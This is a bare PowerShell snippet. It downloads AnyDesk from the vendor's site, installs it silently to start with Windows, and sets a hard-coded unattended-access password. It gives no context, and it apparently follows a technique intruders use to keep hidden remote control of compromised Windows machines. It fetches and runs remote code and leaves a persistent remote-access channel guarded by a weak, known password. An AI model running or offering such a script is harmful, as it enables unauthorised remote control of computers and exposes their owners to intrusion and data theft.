mkdir "C:\Temp\AynDesk"
$clnt = new-object System.Net.WebClient
$url = "http://download.anydesk.com/AnyDesk.exe"
$file = "C:\Temp\AnyDesk.exe"
$clnt.DownloadFile($url,$file)
cmd.exe /c C:\Temp\AnyDesk.exe --install C:\Temp\AnyDesk --start-with-win --silent
cmd.exe /c echo admin1234!@ | C:\Temp\AnyDesk.exe --set-password